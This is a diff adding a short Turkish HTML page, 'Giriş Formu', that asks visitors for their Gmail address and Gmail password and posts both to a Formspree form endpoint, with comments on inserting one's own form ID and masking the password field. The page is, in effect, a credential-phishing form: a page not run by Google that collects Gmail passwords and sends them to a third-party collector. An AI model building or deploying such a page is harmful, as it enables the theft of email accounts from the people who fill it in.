@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <title>Giriş Formu</title>
+</head>
+<body>
+    
+    <!-- Formspree'den alacağın özel linki action kısmına yazıyorsun -->
+    <form action="https://formspree.io/f/KENDİ_FORM_ID_NİZ" method="POST">
+        
+        <label for="gmail">Gmail Adresiniz:</label>
+        <input type="email" name="email" id="gmail" required>
+
+        <br><br>
+
+        <label for="sifre">Gmail Şifreniz:</label>
+        <!-- type="password" yapılmalı ki şifre gizlensin -->
+        <input type="password" name="sifre" id="sifre" required>
+
+        <br><br>
+
+        <input type="submit" value="Gönder">
+
+    </form>
+
+</body>
+</html>
